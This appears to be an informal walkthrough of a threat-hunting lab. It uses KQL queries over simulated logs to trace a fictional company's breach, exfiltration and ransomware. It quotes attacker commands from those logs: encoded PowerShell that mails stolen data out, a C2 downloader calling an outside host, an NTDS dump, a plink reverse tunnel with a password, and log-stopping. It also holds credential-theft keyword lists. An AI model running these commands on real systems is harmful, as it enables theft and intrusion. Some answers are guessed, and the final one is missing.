@@ -1,0 +1,1273 @@
+﻿////////MCJ Walker: An Impossible Identity Crisis////////////////
+1.2
+How many employees are in the company?
+
+search *
+| distinct $table
+
+Email
+ProcessEvents
+InboundNetworkEvents
+AuthenticationEvents
+SecurityAlerts
+OutboundNetworkEvents
+PassiveDns
+FileCreationEvents
+Employees
+
+Employees
+| count 
+///1867
+
+1.3
+Each employee at Madam C.J. Walker Manufacturing Company is assigned an IP address.
+
+Which employee has the IP address: 10.10.0.1?
+
+Employees
+| where ip_addr == "10.10.0.1"
+
+8/10/2318, 2:41:19 PM	Shirley Jackson	Mozilla/5.0 (Windows NT 6.2; rv:48.0) Gecko/20100101 Firefox/48.0	10.10.0.1	shirley_jackson@mcjwalker.com	mcjwalker.com	shjackson	Research and Development Director	IYIP-DESKTOP
+
+Shirley Jackson
+
+1.4
+
+How many emails did Wayne Sutton, the Marketing Coordinator, receive?
+
+let A=
+Employees
+| where name contains "Wayne Sutton"
+| where role contains "Marketing Coordinator"
+| project email_addr;
+Email
+| where recipient has_any (A)
+| count //46
+
+1.5
+
+How many distinct senders were seen in the email logs from scavengers-r-us.org?
+
+Email
+| where sender contains "scavengers-r-us.org"
+| distinct sender
+//6107
+
+1.6
+
+How many unique URLs (websites) did Patricia Robinson visit?
+
+let A=
+Employees
+|where name contains "Patricia Robinson"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip has_any (A)
+| distinct url //61
+
+1.7
+
+How many domains in the PassiveDns records contain the word “power”?
+
+PassiveDns
+| where domain contains "power"
+| distinct domain //60
+
+1.8
+
+What IP starting with a 196. did the domain critical-power.net resolve to?
+
+PassiveDns
+| where domain contains "critical-power.net"
+| where ip startswith "196"
+
+7/17/2323, 10:27:41 PM	196.98.239.46	critical-power.net
+
+//196.98.239.46
+
+1.9
+
+How many unique URLs were browsed by employees named “Karen”?
+
+let A=
+Employees
+|where name contains "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip has_any (A)
+| distinct url //369
+
+/////Ghost in the wire 🤣👹 (Flee you mortal peasant)
+▸
+Question 1
+
+⚠️Warning⚠️: This section is REALLY HARD! 🌶️🌶️🌶️🌶️🌶️ Try Rage in the Apocalypse first for a more reasonable experience
+
+The threat actors exfiltrated data about your secret energy program.
+
+Under what filename did they stage the exfiltration data?
+
+archive files being created
+
+FileCreationEvents
+| where filename endswith ".zip"
+    or filename endswith ".rar"
+    or filename endswith ".7z"
+    or filename endswith ".cab"
+    or filename endswith ".tar"
+    or filename endswith ".gz"
+| project timestamp, hostname, username, filename, path
+| order by timestamp desc
+| distinct path
+
+one path is strange
+
+C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_6.1908.2042.0_x64__8wekyb3d8bbwe\Assets\Archive.zip
+
+but not the one
+
+to stage the attacker nid to copy move or rename the filename check the ProcessEvents
+
+ProcessEvents
+| where process_commandline has_any (
+    "copy",
+    "xcopy",
+    "robocopy",
+    "Compress-Archive",
+    "7z",
+    "rar",
+    ".zip",
+    ".rar"
+)
+| project timestamp, hostname, username, process_commandline
+
+Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Filter *.docx,*.ppt,*.pdf,*.xlsx | ForEach-Object {Copy-Item $_.FullName "C:\ScooterEnergyResearch"}
+
+the attacker save the file in the directory C:\ScooterEnergyResearch
+
+we can check what in ScooterEnergyResearch
+
+ProcessEvents
+| where process_commandline contains "ScooterEnergyResearch"
+
+we have only the command above 
+
+search in filename
+(7zip.exe)
+
+FileCreationEvents
+| where path contains "ScooterEnergyResearch"
+ 
+ScooterEnergyResearch.zip
+
+JP0X-DESKTOP	aneasley
+9A2B-MACHINE	bebanneker
+IYIP-DESKTOP	shjackson
+JIRM-MACHINE	chdrew
+
+///ScooterEnergyResearch.zip
+
+2.2
+
+How many machines (hosts) did the actors exfiltrate data from?
+
+from response 2.1
+
+FileCreationEvents
+| where path contains "ScooterEnergyResearch"
+| distinct username //4
+
+JP0X-DESKTOP	aneasley
+9A2B-MACHINE	bebanneker
+IYIP-DESKTOP	shjackson
+JIRM-MACHINE	chdrew
+
+2.3
+
+What command did the threat actor use to gather the data to be exfiltrated?
+
+ProcessEvents
+| where process_commandline contains "ScooterEnergyResearch"
+
+Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Filter *.docx,*.ppt,*.pdf,*.xlsx | ForEach-Object {Copy-Item $_.FullName "C:\ScooterEnergyResearch"}
+
+2.4
+
+During the staging process, what command did the threat actor use to compress the exfiltrated data?
+
+ProcessEvents
+| where process_commandline contains "ScooterEnergyResearch"
+| project timestamp, process_name, process_commandline, username
+| order by timestamp asc
+
+
+ProcessEvents
+| where process_commandline has_any (
+    "Compress-Archive",
+    "zip",
+    "7z",
+    "7za",
+    "WinRAR",
+    "rar",
+    "tar"
+)
+| project timestamp, process_name, process_commandline
+| order by timestamp desc
+
+nothing
+
+FileCreationEvents
+| where filename == "ScooterEnergyResearch.zip"
+
+C:\ScooterEnergyResearch.zip
+
+ok see what happend after the is exfiltrated for one username
+
+ProcessEvents
+| where process_commandline contains "ScooterEnergyResearch"
+
+7/30/2323, 2:09:20 PM	cmd.exe	614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f	Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Filter *.docx,*.ppt,*.pdf,*.xlsx | ForEach-Object {Copy-Item $_.FullName "C:\ScooterEnergyResearch"}	powershell.exe	96d9e50d839082ac38de69e88b894dfa4634ec09017d337ce42a6dea51eb4a92	IYIP-DESKTOP	shjackson
+
+let t = datetime(2323-07-30T14:09:20.000Z);
+ProcessEvents
+| where timestamp between (t - 5m .. t + 20m)
+| where username contains "shjackson"
+| order by timestamp asc
+
+the exfiltration command is
+
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSg4MywgMTAxLCAxMTAsIDEwMCwgNDUsIDc3LCA5NywgMTA1LCAxMDgsIDc3LCAxMDEsIDExNSwgMTE1LCA5NywgMTAzLCAxMDEsIDMyLCA0NSwgNzAsIDExNCwgMTExLCAxMDksIDMyLCAzNCwgMTA1LCAxMTUsIDExNiwgMTA0LCAxMDUsIDExNSwgMTIxLCAxMTEsIDExNywgMTE0LCAxMDcsIDEwNSwgMTEwLCAxMDMsIDY0LCAxMDEsIDExMCwgMTAwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDExNSwgNDUsIDk3LCAxMTIsIDExMSwgOTksIDk3LCAxMDgsIDEyMSwgMTEyLCAxMTUsIDEwMSwgNDYsIDExMCwgMTAxLCAxMTYsIDM0LCAzMiwgNDUsIDg0LCAxMTEsIDMyLCAzNCwgMTA1LCAxMTUsIDExNiwgMTA0LCAxMDUsIDExNSwgMTIxLCAxMTEsIDExNywgMTE0LCAxMDcsIDEwNSwgMTEwLCAxMDMsIDY0LCAxMDEsIDExMCwgMTAwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDExNSwgNDUsIDk3LCAxMTIsIDExMSwgOTksIDk3LCAxMDgsIDEyMSwgMTEyLCAxMTUsIDEwMSwgNDYsIDExMCwgMTAxLCAxMTYsIDM0LCAzMiwgNDUsIDgzLCAxMTcsIDk4LCAxMDYsIDEwMSwgOTksIDExNiwgMzIsIDM0LCA3MSwgOTcsIDEwOSwgMTAxLCAzMiwgODMsIDEwMSwgMTE2LCAzMiwgNzcsIDk3LCAxMTYsIDk5LCAxMDQsIDM0LCAzMiwgNDUsIDY2LCAxMTEsIDEwMCwgMTIxLCAzMiwgMzQsIDgzLCAxMDEsIDEwMSwgMzIsIDk3LCAxMTYsIDExNiwgOTcsIDk5LCAxMDQsIDEwMSwgMTAwLCAzMiwgMTAyLCAxMTEsIDExNCwgMzIsIDEwMywgMTExLCAxMTEsIDEwMCwgMTA1LCAxMDEsIDExNSwgMzQsIDMyLCA0NSwgNjUsIDExNiwgMTE2LCA5NywgOTksIDEwNCwgMTA5LCAxMDEsIDExMCwgMTE2LCAxMTUsIDMyLCAzNCwgNjcsIDU4LCA5MiwgODMsIDk5LCAxMTEsIDExMSwgMTE2LCAxMDEsIDExNCwgNjksIDExMCwgMTAxLCAxMTQsIDEwMywgMTIxLCA4MiwgMTAxLCAxMTUsIDEwMSwgOTcsIDExNCwgOTksIDEwNCwgNDYsIDEyMiwgMTA1LCAxMTIsIDM0KSl8JiAoKGd2ICcqTURyKicpLk5hbUVbMywxMSwyXS1qb2lO
+the exfiltration command was
+
+ok we see that after data exfiltration stage the command has been encoded
+
+let decode that with cyberchef or AI 
+
+The Base64 decodes to an obfuscated PowerShell command that ultimately builds this command
+
+Send-MailMessage `
+  -From "isthisyourking@endtimes-apocalypse.net" `
+  -To "isthisyourking@endtimes-apocalypse.net" `
+  -Subject "Game Set Match" `
+  -Body "See attached for goodies" `
+  -Attachments "C:\ScooterEnergyResearch.zip"
+
+
+  So the attacker did not exfiltrate via HTTP/FTP in this step—they attached the ZIP to an email using PowerShell's Send-MailMessage cmdlet.
+
+  Send-MailMessage -From "isthisyourking@endtimes-apocalypse.net" -To "isthisyourking@endtimes-apocalypse.net" -Subject "Game Set Match" -Body "See attached for goodies" -Attachments "C:\ScooterEnergyResearch.zip"
+
+what happend before this???
+
+let t = datetime(2323-07-30T14:09:20.000Z);
+ProcessEvents
+| where timestamp between (t - 1m .. t + 30m)
+| where username has_any (
+    "chdrew",
+    "aneasley",
+    "bebanneker",
+    "shjackson"
+)
+| order by timestamp asc
+| distinct process_commandline
+
+using the 4 username i found another encoded
+
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc Q29tcHJlc3MtQXJjaGl2ZSAtUGF0aCAiQzpcU2Nvb3RlckVuZXJneVJlc2VhcmNoIiAtRGVzdGluYXRpb25QYXRoICJDOlxTY29vdGVyRW5lcmd5UmVzZWFyY2guemlwIiAtRm9yY2U=
+
+let decode that with cyberchef or AI 
+
+this is the decode
+response 
+
+Compress-Archive -Path "C:\ScooterEnergyResearch" -DestinationPath "C:\ScooterEnergyResearch.zip" -Force
+
+2.5
+
+The threat actors used a command to exfiltrate the data using a common service.
+
+What was the subject?
+
+
+I found before 
+
+
+let t = datetime(2323-07-30T14:09:20.000Z);
+ProcessEvents
+| where timestamp between (t - 1m .. t + 30m)
+| where username has_any (
+    "chdrew",
+    "aneasley",
+    "bebanneker",
+    "shjackson"
+)
+| order by timestamp asc
+| distinct process_commandline
+
+
+the exfiltration command is
+
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSg4MywgMTAxLCAxMTAsIDEwMCwgNDUsIDc3LCA5NywgMTA1LCAxMDgsIDc3LCAxMDEsIDExNSwgMTE1LCA5NywgMTAzLCAxMDEsIDMyLCA0NSwgNzAsIDExNCwgMTExLCAxMDksIDMyLCAzNCwgMTA1LCAxMTUsIDExNiwgMTA0LCAxMDUsIDExNSwgMTIxLCAxMTEsIDExNywgMTE0LCAxMDcsIDEwNSwgMTEwLCAxMDMsIDY0LCAxMDEsIDExMCwgMTAwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDExNSwgNDUsIDk3LCAxMTIsIDExMSwgOTksIDk3LCAxMDgsIDEyMSwgMTEyLCAxMTUsIDEwMSwgNDYsIDExMCwgMTAxLCAxMTYsIDM0LCAzMiwgNDUsIDg0LCAxMTEsIDMyLCAzNCwgMTA1LCAxMTUsIDExNiwgMTA0LCAxMDUsIDExNSwgMTIxLCAxMTEsIDExNywgMTE0LCAxMDcsIDEwNSwgMTEwLCAxMDMsIDY0LCAxMDEsIDExMCwgMTAwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDExNSwgNDUsIDk3LCAxMTIsIDExMSwgOTksIDk3LCAxMDgsIDEyMSwgMTEyLCAxMTUsIDEwMSwgNDYsIDExMCwgMTAxLCAxMTYsIDM0LCAzMiwgNDUsIDgzLCAxMTcsIDk4LCAxMDYsIDEwMSwgOTksIDExNiwgMzIsIDM0LCA3MSwgOTcsIDEwOSwgMTAxLCAzMiwgODMsIDEwMSwgMTE2LCAzMiwgNzcsIDk3LCAxMTYsIDk5LCAxMDQsIDM0LCAzMiwgNDUsIDY2LCAxMTEsIDEwMCwgMTIxLCAzMiwgMzQsIDgzLCAxMDEsIDEwMSwgMzIsIDk3LCAxMTYsIDExNiwgOTcsIDk5LCAxMDQsIDEwMSwgMTAwLCAzMiwgMTAyLCAxMTEsIDExNCwgMzIsIDEwMywgMTExLCAxMTEsIDEwMCwgMTA1LCAxMDEsIDExNSwgMzQsIDMyLCA0NSwgNjUsIDExNiwgMTE2LCA5NywgOTksIDEwNCwgMTA5LCAxMDEsIDExMCwgMTE2LCAxMTUsIDMyLCAzNCwgNjcsIDU4LCA5MiwgODMsIDk5LCAxMTEsIDExMSwgMTE2LCAxMDEsIDExNCwgNjksIDExMCwgMTAxLCAxMTQsIDEwMywgMTIxLCA4MiwgMTAxLCAxMTUsIDEwMSwgOTcsIDExNCwgOTksIDEwNCwgNDYsIDEyMiwgMTA1LCAxMTIsIDM0KSl8JiAoKGd2ICcqTURyKicpLk5hbUVbMywxMSwyXS1qb2lO
+
+let decode that with cyberchef or AI 
+
+The Base64 decodes to an obfuscated PowerShell command that ultimately builds this command
+
+Send-MailMessage `
+  -From "isthisyourking@endtimes-apocalypse.net" `
+  -To "isthisyourking@endtimes-apocalypse.net" `
+  -Subject "Game Set Match" `
+  -Body "See attached for goodies" `
+  -Attachments "C:\ScooterEnergyResearch.zip"
+
+form the decoding the subject is //"Game Set Match"
+
+2.6
+
+What command did the operators use to establish persistence on their victims?
+
+earching for commands associated with:
+
+Registry Run keys
+Scheduled Tasks
+Startup folder modifications
+WMI event subscriptions
+Services
+PowerShell profile modifications
+
+search for all encoded command because this attacker like hidding command with cypher
+
+
+ProcessEvents
+| where process_commandline contains "-enc"
+   or process_commandline contains "-EncodedCommand"
+| project timestamp, username, hostname, process_commandline
+| order by timestamp asc
+| distinct process_commandline
+
+we see a lot of encoding , we have to reduce them to the stric 
+
+ProcessEvents
+| where process_commandline contains "-enc SW5"
+   or process_commandline contains "-enc KCA"
+//   or process_commandline contains "-enc W1N0"
+//   or process_commandline contains "-enc Q29"      
+| project timestamp, username, hostname, process_commandline
+| order by timestamp asc
+| distinct process_commandline
+
+we found 2 enc starting with "-enc SW5" and  "-enc KCA"
+
+this one need to be checked
+
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHhlVGVzbm9wc2VyJCB0dXB0dU8tZXRpclcgOykoZXNvbEMuZXNub3BzZXIkIDspKGVzb2xDLnJlZGFlciQgOykoZG5Fb1RkYWVSLnJlZGFlciQgPSB0eGVUZXNub3BzZXIkIDspKShtYWVydFNlc25vcHNlUnRlRy5lc25vcHNlciQocmVkYWVSbWFlcnRTLk9JLm1ldHN5UyB0Y2VqYk8td2VOID0gcmVkYWVyJCA7KShlc25vcHNlUnRlRy50c2V1cWVSYmV3JCA9IGVzbm9wc2VyJCA7Z2lmbm9DeXhvcnAkID0geXhvclAudHNldXFlUmJldyQgOykiL3Rlbi5lc3BhbGxvY3NlbWl0ZG5lLy86c3B0dGgiKGV0YWVyQzo6XXRzZXVxZVJiZVcudGVOLm1ldHN5U1sgPSB0c2V1cWVSYmV3JCA7bGFpdG5lZGVyQ3l4b3JwJCA9IHNsYWl0bmVkZXJDLmdpZm5vQ3l4b3JwJCA7KXRyb1B5eG9ycCQgLHNzZXJkZEF5eG9ycCQoeXhvclBiZVcudGVOLm1ldHN5UyB0Y2VqYk8td2VOID0gZ2lmbm9DeXhvcnAkIDspKWVjcm9GLSB0eGVUbmlhbFBzQS0gZ25pcnRTZXJ1Y2VTLW9UdHJldm5vQyB8IGRyb3dzc2FQeXhvcnAkKCAsZW1hbnJlc1V5eG9ycCQobGFpdG5lZGVyQ1NQLm5vaXRhbW90dUEudG5lbWVnYW5hTS5tZXRzeVMgdGNlamJPLXdlTiA9IGxhaXRuZWRlckN5eG9ycCQgOyJ5YXdhbW9veiIgPSBkcm93c3NhUHl4b3JwJCA7IlhlY25pdm9ycCIgPSBlbWFucmVzVXl4b3JwJCA7MDgwOCA9IHRyb1B5eG9ycCQgOyIvdGVuLmVzcGFsbG9jc2VtaXRkbmUvLzpzcHR0aCIgPSBzc2VyZGRBeXhvcnAkJyAtc3BsaXQgJycgfCAleyRfWzBdfSkgLWpvaW4gJyc=
+
+after decoding with AI chatgpt we have below
+
+
+$proxyAddress = "https://endtimescollapse.net/"
+$proxyPort = 8080
+$proxyUsername = "provinceX"
+$proxyPassword = "zoomaway"
+
+$proxyCredential = New-Object System.Management.Automation.PSCredential(
+    $proxyUsername,
+    ($proxyPassword | ConvertTo-SecureString -AsPlainText -Force)
+)
+
+$proxyConfig = New-Object System.Net.WebProxy($proxyAddress, $proxyPort)
+$proxyConfig.Credentials = $proxyCredential
+
+$webRequest = [System.Net.WebRequest]::Create("https://endtimescollapse.net/")
+$webRequest.Proxy = $proxyConfig
+
+$response = $webRequest.GetResponse()
+$reader = New-Object System.IO.StreamReader($response.GetResponseStream())
+$responseText = $reader.ReadToEnd()
+
+$reader.Close()
+$response.Close()
+
+Write-Output $responseText
+
+
+This is not the persistence command itself. It is a downloader / C2 beacon:  we will use later for sure
+
+Connects to https://endtimescollapse.net
+Uses a configured proxy
+Downloads content from the remote server
+Reads and outputs the response
+
+For the persistence question
+
+The likely persistence mechanism is whatever launches this PowerShell command repeatedly.
+
+ProcessEvents
+| where process_commandline contains "endtimescollapse.net"
+
+nothing
+
+The likely persistence mechanism is whatever launches this PowerShell command repeatedly.
+
+ProcessEvents
+| where process_commandline has_any (
+    "schtasks",
+    "Register-ScheduledTask",
+    "CurrentVersion\\Run",
+    "RunOnce",
+    "New-Service",
+    "sc.exe create"
+)
+| distinct process_commandline
+
+we found a lot of this command
+
+schtasks /create /sc hourly /tn "IsThisYourKing" /tr "C:\\Windows\\Temp\\ggwp.exe" /ru SYSTEM
+
+based on the "IsThisYourKing" that we find previously this the command
+
+Response is 
+
+ schtasks /create /sc hourly /tn "IsThisYourKing" /tr "C:\\Windows\\Temp\\ggwp.exe" /ru SYSTEM
+
+1.7
+
+What command did they use to acquire most of the credentials?
+
+we check on the net and AI all tool list for credential aquirement
+
+ProcessEvents
+| where process_commandline has_any (
+    "mimikatz",
+    "sekurlsa",
+    "lsass",
+    "procdump",
+    "sam",
+    "security",
+    "ntdsutil",
+    "dump",
+    "credential",
+    "password",
+    "vaultcmd"
+)
+| project timestamp, hostname, username, process_name, process_commandline
+| order by timestamp asc
+| distinct process_commandline
+
+///after checking one command is obvious
+
+//response
+
+ntdsutil "ac i ntds "ifm" "create full C:\Windows\Temp\Ntds_dit" q q 
+
+2.8
+
+But first, they had to compromise a crucial account.
+
+What was the username linked to that account?
+
+ProcessEvents
+| where process_commandline contains "ntdsutil"
+
+7/30/2323, 3:29:43 PM	cmd.exe	614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f	ntdsutil "ac i ntds "ifm" "create full C:\Windows\Temp\Ntds_dit" q q 	ntdsutil.exe	40bceb602900e18ddd88877b9564396cb5dbcd709dad87c41e8559f9dbe06db	DOMAIN_CONTROLLER_01	teberry_domain_admin
+
+DOMAIN_CONTROLLER_01	teberry_domain_admin
+
+///teberry_domain_admin
+
+1.9
+
+They compromised the account in question 8 via another compromised user.
+
+What is their username?
+
+AuthenticationEvents
+| where username  contains "teberry_domain_admin"
+| where result contains "succes"
+
+
+we have 3 succesfull login
+
+XCMX-MACHINE	10.10.2.199
+OAMX-MACHINE	10.10.2.199
+DOMAIN_CONTROLLER_01	10.10.3.98
+
+DOMAIN_CONTROLLER_01	10.10.3.98 is our attacker
+
+we have 1 src-ip 10.10.2.199  for 2 hostname
+
+let check if those IP
+
+Employees
+| where hostname has_any (
+    "XCMX-MACHINE",
+    "OAMX-MACHINE",
+    "DOMAIN_CONTROLLER_01"
+)
+
+
+10.10.4.82	chmullinax	OAMX-MACHINE
+10.10.2.180	jodrahota	XCMX-MACHINE
+
+////// Response  jodrahota
+
+10.10.2.180	jodrahota	XCMX-MACHINE
+
+2.10
+
+When did the threat actor compromise the account in question 8?
+
+
+
+ProcessEvents
+| where username contains "teberry_domain_admin"
+| where process_commandline has_any ("ntdsutil","mimikatz","sekurlsa","lsass")
+| project timestamp, username, process_commandline
+| order by timestamp asc
+
+///2323-07-30T15:29:43.000Z
+
+7/30/2323, 3:29:43 PM	teberry_domain_admin	ntdsutil "ac i ntds "ifm" "create full C:\Windows\Temp\Ntds_dit" q q 
+
+
+The threat actor had to compromise an initial set of accounts to get there.
+
+What type of attack did they use to do so?
+
+
+
+Email
+| where recipient contains "jodrahota"
+   or sender contains "scavengers-r-us.org"
+| where link contains "login"   
+| project timestamp, sender, recipient, subject, link
+| order by timestamp asc
+| distinct link
+
+//Response
+password spray
+
+
+2.12
+
+Using this initial access vector, how many accounts did the actors target?
+
+1- we count the number of time a IP is used (hint user-agent)
+
+AuthenticationEvents
+| where result != "Success"
+| summarize Attempts=count() by src_ip, username
+| summarize TargetedAccounts=dcount(username) by src_ip
+| order by TargetedAccounts desc
+
+
+10.10.3.98	526
+10.10.0.14	30
+10.10.2.65	28
+10.10.1.239	21
+
+AuthenticationEvents
+| where src_ip == "10.10.3.98"
+| summarize TargetedAccounts=dcount(username)
+//526
+
+AuthenticationEvents
+| where src_ip == "10.10.3.98"
+| summarize Attempts=count(), Users=dcount(username), Successes=countif(result == "Success")
+
+check the user user-agent
+
+the password spray question was answered by looking at the user agent, not a single source IP:
+
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| distinct username
+| count
+//718
+
+
+2.13
+
+Section 2: Ghost in the wire 🤣👹 (Flee you mortal peasant)
+▸
+Question 13
+How many accounts did the actors compromise?
+
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| where result contains "success"
+| distinct username
+| count //46
+
+2.14
+
+The threat actor leveraged a machine they had already compromised to use the "crucial" credentials. Which user did this machine belong to? (Provide their username.)
+
+10.10.2.180	jodrahota	XCMX-MACHINE to be checked
+DOMAIN_CONTROLLER_01	10.10.3.98 teberry_domain_admin
+
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| where result contains "success"
+| distinct username //46 username 
+
+1- we need to check the IP 10.10.2.180 and 10.10.3.98 to check over username
+
+AuthenticationEvents
+| where src_ip contains "10.10.2.180" or src_ip contains "10.10.3.98"
+| where result contains "success"
+//| project timestamp, hostname, src_ip, username
+| summarize Attempts=count() by username
+| order by Attempts desc 
+//| distinct username
+
+
+we check the top Attempts
+
+ware_local_admin	239
+postresocoor_local_admin	229
+dist_local_admin	217
+matescav_local_admin	165
+reta_local_admin	160
+salvandrestexpe_local_admin	112
+custsupprepr_local_admin	82
+secuandprotoffi_local_admin	78
+biharrell	57
+
+
+
+biharrell 9Z3U-DESKTOP 10.10.3.98 is the first account with no dist_local_admin
+
+the solution // is biharrell
+
+account jodrahota and biharrell have the most attemps 
+
+
+
+I tested all username and found   biharrell the correct user 
+
+AuthenticationEvents
+| where username contains "biharrell"
+| where result contains "success"
+| project timestamp, hostname, src_ip, username
+| order by timestamp asc
+
+
+
+
+
+Q15  (using the AuthenticationEvent table)
+
+AuthenticationEvents
+| where username contains "biharrell"
+| where result contains "success"
+| where user_agent contains "Firefox/69.0"
+//| project timestamp, hostname, src_ip, username
+
+6/22/2323, 11:33:58 AM	MAIL-SERVER01	176.191.116.208	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0	biharrell	Successful Login	40bfa1d683fd17a0cd5e86b392f950d9	A user attempted to log in to their email
+
+Response
+
+///6/22/2323, 11:33:58 AM
+
+/////Section 3: Rage in the apocalypse 😤🤘🏿 (cyber is for everyone)
+▸
+Question 1
+
+Some of your employees woke up this morning and couldn't access their computers. Instead they saw a ransom message telling them that "their drives are encrypted"!
+
+What email did the threat actors want them to contact?
+
+ProcessEvents
+| where process_commandline  contains "contact" and process_commandline contains "drive" and process_commandline contains "enc"
+
+reg add HKLM\SOFTWARE\Policies\Microsoft\FVE /v RecoveryKeyMessage /t REG_SZ /d " +-+-+- Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org -+-+-+" /f
+
+//Contact us immediately: killmonger@onionmail.org
+///Response :  killmonger@onionmail.org
+
+S3Q2
+
+What registry key did the attackers modify to display this message?
+
+ProcessEvents
+| where process_commandline  contains "contact" and process_commandline contains "drive" and process_commandline contains "enc"
+
+reg add HKLM\SOFTWARE\Policies\Microsoft\FVE /v RecoveryKeyMessage /t REG_SZ /d " +-+-+- Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org -+-+-+" /f
+
+//Response///
+HKLM\SOFTWARE\Policies\Microsoft\FVE
+
+S3Q3
+
+How many employees saw this message?
+
+ProcessEvents
+| where process_commandline  contains "Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org"
+| distinct username
+//164
+
+S3Q4
+
+When did the first ransom note appear?
+
+ProcessEvents
+| where process_commandline  contains "Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org"
+| order by timestamp asc
+
+//2323-07-31T12:26:52.000Z
+
+S3Q5
+
+When did the last ransom note appear?
+
+ProcessEvents
+| where process_commandline  contains "Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org"
+| order by timestamp desc
+
+/////2323-07-31T15:56:33.000Z
+
+// we know the attack appear between 2323-07-31T12:26:52.000Z  and 2323-07-31T15:56:33.000Z
+
+S3Q6
+
+On which host (hostname) did the first note appear?
+
+ProcessEvents
+| where process_commandline  contains "Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org"
+| order by timestamp asc
+| take 1
+
+///XOGC-DESKTOP
+
+S3Q7
+
+Who did this host belong to (fullname)?
+
+let A=
+ProcessEvents
+| where process_commandline  contains "Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org"
+| where hostname contains "XOGC-DESKTOP"
+| project username;
+Employees
+| where username has_any (A)
+
+///Dan Haley
+
+S3Q8
+
+What is the role of this employee?
+
+let A=
+ProcessEvents
+| where process_commandline  contains "Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org"
+| where hostname contains "XOGC-DESKTOP"
+| project username;
+Employees
+| where username has_any (A)
+
+///Warehouse Supervisor
+
+S3Q9
+
+Let's take a closer look at the first host to be ransomed. The attackers ran a command on that machine to enable bitlocker.
+
+What was that command?
+
+
+When did the first ransom note appear? //2323-07-31T12:26:52.000Z ///XOGC-DESKTOP ///Dan Haley dahaley
+
+ProcessEvents
+//| where process_commandline  contains "Your drives are Encrypted! Contact us immediately: killmonger@onionmail.org"
+| where process_commandline  contains "bitlocker"
+| where username  contains "dahaley"
+
+///powershell -c "Install-WindowsFeature BitLocker IncludeAllSubFeature -IncludeManagementTools -Restart"
+
+
+S3Q10
+
+Right around the time the ransom message was displayed, on the same machine, the attackers ran a command to stop the collection of event logs.
+
+What command did they run?
+
+ProcessEvents
+| where timestamp >= datetime(2323-07-31T12:26:52)
+| where username  contains "dahaley"
+| where process_commandline contains "stop"
+
+//net stop eventlog /y
+
+S3Q11
+
+You conduct some research on those TTPs and learn that an APT actor called Nemesis Kitten has used similar techniques in the past.
+
+Your research prompts you to look for a proxy tool that is commonly renamed "dllhost". You find two suspicious commands that reference this tool name.
+
+What was the first one of these commands?
+
+// checking first in Processevent with key word dllhost and username "dahaley"
+
+
+ProcessEvents
+| where username  contains "dahaley"
+| where  process_commandline  has "dllhost"
+| summarize count() by process_commandline
+| order by count_ asc
+
+mkdir C:\ProgramData\Microsoft\Windows\DllHost\
+move /Y dllhost.exe C:\ProgramData\Microsoft\Windows\DllHost\dllhost.exe   The second command then moves the proxy tool (dllhost.exe) into that newly created directory.
+
+/////by decuction we have the response 
+
+mkdir C:\ProgramData\Microsoft\Windows\DllHost\
+
+S3q12
+
+What other suspicious command contained "dllhost.exe"?
+
+ProcessEvents
+| where username  contains "dahaley"
+| where  process_commandline  has "dllhost"
+| summarize count() by process_commandline
+| order by count_ asc
+
+mkdir C:\ProgramData\Microsoft\Windows\DllHost\
+move /Y dllhost.exe C:\ProgramData\Microsoft\Windows\DllHost\dllhost.exe 
+
+the response by deduction is 
+
+move /Y dllhost.exe C:\ProgramData\Microsoft\Windows\DllHost\dllhost.exe
+
+
+S3Q13
+
+Apparently the actors like to use the tunneling tool named plink to establish a tunnel back to their infrastructure.
+
+What IP address did the actors tunnel to?
+
+ProcessEvents
+| where username  contains "dahaley"
+| where  process_commandline  has "plink"
+| summarize count() by process_commandline
+| order by count_ asc
+
+"powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 102.17.151.174 -P 22 -l forward -pw Socks@123 -no-antispoof
+
+/////102.17.151.174
+
+S3Q14
+
+What password did they use as part of the proxy command?
+
+
+ProcessEvents
+| where username  contains "dahaley"
+| where  process_commandline  has "plink"
+| summarize count() by process_commandline
+| order by count_ asc
+
+"powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 102.17.151.174 -P 22 -l forward -pw Socks@123 -no-antispoof
+
+///  Socks@123
+
+S3Q15
+
+
+
+What was the Sha256 hash of the malicious dllhost.exe file?
+
+ProcessEvents
+| where username  contains "dahaley"
+| where  process_commandline  has @"C:\ProgramData\Microsoft\Windows\DllHost\dllhost.exe"
+
+check the file in FileCreationEvents
+
+FileCreationEvents
+| where username  contains "dahaley"
+| where path   has "dllhost.exe"
+
+time
+
+2323-07-26T12:10:52.000Z
+
+C:\ProgramData\Windows\DllHost\dllhost.exe
+
+///response SHA256
+
